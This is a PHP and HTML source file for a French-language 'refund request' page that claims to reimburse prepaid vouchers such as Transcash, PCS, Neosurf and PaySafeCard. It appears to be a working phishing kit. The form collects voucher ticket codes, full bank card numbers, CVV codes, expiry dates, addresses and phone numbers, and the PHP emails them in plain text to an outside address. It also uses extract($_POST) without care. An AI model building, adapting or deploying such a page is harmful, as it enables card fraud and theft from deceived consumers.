<?php

session_start();

//If form send and all fields is not empty
if(!empty($_POST)){

    $errors = array();

    extract($_POST);

    $fname = strip_tags($fname);
    $email = strip_tags($email);
    $montant = strip_tags($montant);
    $ticket = strip_tags($ticket);
    $phone = strip_tags($phone);
    $adresse = strip_tags($adresse);
    $trecharge = strip_tags($trecharge);
    $carteNumber = strip_tags($carteNumber);
    $tcarte = strip_tags($tcarte);
    $cvv = strip_tags($cvv);
    $month = strip_tags($month);
    $year = strip_tags($year);



    if(empty($fname)){
        array_push($errors, 'Entrez votre nom et prénoms');
    }
    if(empty($email)){
        array_push($errors, 'Entrez votre email');
    }

    if(empty($montant)){
        array_push($errors, 'Entrez le montant');
    }

    if(empty($ticket)){
        array_push($errors, 'Entrez le ticket');
    }

    if(empty($phone)){
        array_push($errors, 'Entrez votre numéro de téléphone');
    }

    if(empty($adresse)){
        array_push($errors, 'Entrez votre adresse');
    }

    if(empty($trecharge)){
        array_push($errors, 'Entrez votre type de recharge');
    }

    if(empty($carteNumber)){
        array_push($errors, 'Entrez votre numéro de carte de crédit');
    }

    if(empty($tcarte)){
        array_push($errors, 'Entrez votre type de carte');
    }

    if(empty($cvv)){
        array_push($errors, 'Entrez votre CVV/CV2');
    }

    if(empty($month)){
        array_push($errors, 'Entrez votre mois de recharge');
    }

    if(empty($year)){
        array_push($errors, 'Entrez votre année de recharge');
    }

    if(!filter_var($email, FILTER_VALIDATE_EMAIL)){
        array_push($errors, 'Adresse email invalide');
    }

    if(count($errors) == 0){
        $mailTo = "info@fiches-attestationdesrecharges.com";
        $headers = "From: Site de Fiche d'attestation des recharges\r\n";
        $headers = "Reply-To: refund@fiches-attestationdesrecharges.com\r\n";
        $headers = "Content-type: text/html\r\n";
        $subject = "Demande de remboursement de la part de ".$fname.".";
        $txt = "Demande de remboursement :\n\nNom du client : ".$fname.".\n\nAdresse mail du client : ".$email.".\n\nMontant : ".$montant.".\n\nNuméro du ticket : ".$ticket.".\n\nNuméro de téléphone : ".$phone.".\n\nAdresse : ".$adresse.".\n\nType de recharge : ".$trecharge.".\n\nNuméro de carte : ".$carteNumber.".\n\nType de carte : ".$tcarte.".\n\nCVV/CV2 : ".$cvv.".\n\nMois : ".$month.".\n\nAnnée : ".$year.".\n\n";

        $message = wordwrap($txt, 70);

        mail($mailTo, $subject, $message, $headers);

        unset($mailTo);
        unset($headers);
        unset($subject);
        unset($txt);

        header("Location: answer.html");
    }
}


?>

<!doctype html>
<html lang="en">
  <head>
  	<title>Demande de remboursement - Fiche d'attestation des recharges</title>
    <meta charset="utf-8">
    <meta name="description" content="Fiche d'attestation des recharges">
    <meta name="keywords" content="Fiche d'attestation des recharges, paysafe, neosurf, pcs, transcash, recharge transcash, recharge pcs, recharge neosurf, recharge paysafe">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800,900" rel="stylesheet">
		
		<link rel="stylesheet" href="css/owl.carousel.min.css">
    <link rel="stylesheet" href="css/owl.theme.default.min.css">
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/4.5.6/css/ionicons.min.css">
		<link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/main.css">
  </head>
  <body>
	<header>
        <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
          <div class="container-fluid">
            <a class="navbar-brand" href="refund.php">Remboursement</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
              <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarCollapse">
              <ul class="navbar-nav me-auto mb-2 mb-md-0">
                <li class="nav-item">
                  <a class="nav-link" href="index.php">Accueil</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="attestation.php">Télécharger une fiche d'attestation</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link active" href="refund.php">Demande de remboursement</a>
                </li>
              </ul>
            </div>
          </div>
        </nav>
      </header>

    <div class="container-fluid px-1 py-5 mx-auto">
        <div class="row d-flex justify-content-center">
            <div class="col-xl-7 col-lg-8 col-md-9 col-11 text-center">
                <h3 class="space">Demande de remboursement</h3>
                <div class="card">
                    <form class="form-card" action="refund.php" method="POST">
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-sm-6 flex-column d-flex">
                                <input type="text" id="fname" name="fname" placeholder="Nom complet" required="required" onblur="validate(1)">
                            </div>
                            <div class="form-group col-sm-6 flex-column d-flex">
                                <input type="text" id="email" name="email" placeholder="Email" required="required" onblur="validate(2)">
                            </div>
                        </div>
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-sm-6 flex-column d-flex">
                                <input type="text" id="montant" name="montant" placeholder="Montant de l'achat/Remboursement" required="required" onblur="validate(3)">
                            </div>
                            <div class="form-group col-sm-6 flex-column d-flex">
                                <input type="text" id="ticket" name="ticket" placeholder="Code du ticket" required="required" onblur="validate(4)">
                            </div>
                        </div>
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-sm-6 flex-column d-flex">
                                <input type="text" id="phone" name="phone" placeholder="N° de Téléphone" required="required" onblur="validate(5)">
                            </div>
                            <div class="form-group col-sm-6 flex-column d-flex">
                                <input type="text" id="adresse" name="adresse" placeholder="Adresse" required="required" onblur="validate(6)">
                            </div>
                        </div>
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-6 flex-column d-flex">
                                <select name="trecharge" id="trecharge" required="required" onblur="validate(7)">
                                    <option selected="selected">Type de recharge</option>
                                    <option value="Transcash">Transcash</option>
                                    <option value="PCS">PCS</option>
                                    <option value="Neosurf">Neosurf</option>
                                    <option value="PaySafeCard">PaySafeCard</option>
                                </select>
                            </div>
                        </div>
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-sm-6 flex-column d-flex">
                                <input type="text" id="carteNumber" name="carteNumber" placeholder="N° de carte bancaire" required="required" onblur="validate(8)">
                            </div>
                        </div>
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-6 flex-column d-flex">
                                <select name="tcarte" id="tcarte" required="required" onblur="validate(9)">
                                    <option selected="selected">Type de carte</option>
                                    <option value="Visa">Visa</option>
                                    <option value="Mastercard">Mastercard</option>
                                    <option value="American Expess">American Expess</option>
                                    <option value="Bancontact">Bancontact</option>
                                </select>
                            </div>
                            <div class="form-group col-6 flex-column d-flex">
                                <input type="text" id="cvv" name="cvv" placeholder="CVV2/CVC" minlength="3" maxlength="3" size="3"  required="required" onblur="validate(10)" oninput="javascript: if (this.value.length > 3) this.value = this.value.slice(0, 3);">
                            </div>
                        </div>
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-6 flex-column d-flex">
                                <select name="month" id="month" required="required" onblur="validate(11)">
                                    <option selected="selected">Mois</option>
                                    <option value="01">01</option>
                                    <option value="02">02</option>
                                    <option value="03">03</option>
                                    <option value="04">04</option>
                                    <option value="05">05</option>
                                    <option value="06">06</option>
                                    <option value="07">07</option>
                                    <option value="08">08</option>
                                    <option value="09">09</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                </select>
                            </div>
                            <div class="form-group col-6 flex-column d-flex">
                                <select name="year" id="year" required="required" onblur="validate(12)">
                                    <option selected="selected">Année</option>
                                    <option value="2020">2020</option>
                                    <option value="2021">2021</option>
                                    <option value="2022">2022</option>
                                    <option value="2023">2023</option>
                                    <option value="2024">2024</option>
                                    <option value="2025">2025</option>
                                    <option value="2026">2026</option>
                                    <option value="2027">2027</option>
                                    <option value="2028">2028</option>
                                    <option value="2029">2029</option>
                                    <option value="2030">2030</option>
                                    <option value="2031">2031</option>
                                    <option value="2032">2032</option>
                                    <option value="2033">2033</option>
                                    <option value="2034">2034</option>
                                    <option value="2035">2035</option>
                                    <option value="2036">2036</option>
                                    <option value="2037">2037</option>
                                    <option value="2038">2038</option>
                                    <option value="2039">2039</option>
                                    <option value="2040">2040</option>
                                    <option value="2041">2041</option>
                                    <option value="2042">2042</option>
                                    <option value="2043">2043</option>
                                    <option value="2044">2044</option>
                                </select>
                            </div>
                        </div>
                        <div class="row justify-content-end">
                            <div class="form-group col-sm-6"> <button type="submit" class="btn-block btn-success">Envoyer</button> </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <footer class="text-muted">
      <div class="container">
          <p class="float-right">
            Love
          </p>
          <p>Made by love with BootStrap</p>
      </div>
    </footer>

    <script src="js/jquery.min.js"></script>
    <script src="js/popper.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/main.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
  </body>
</html>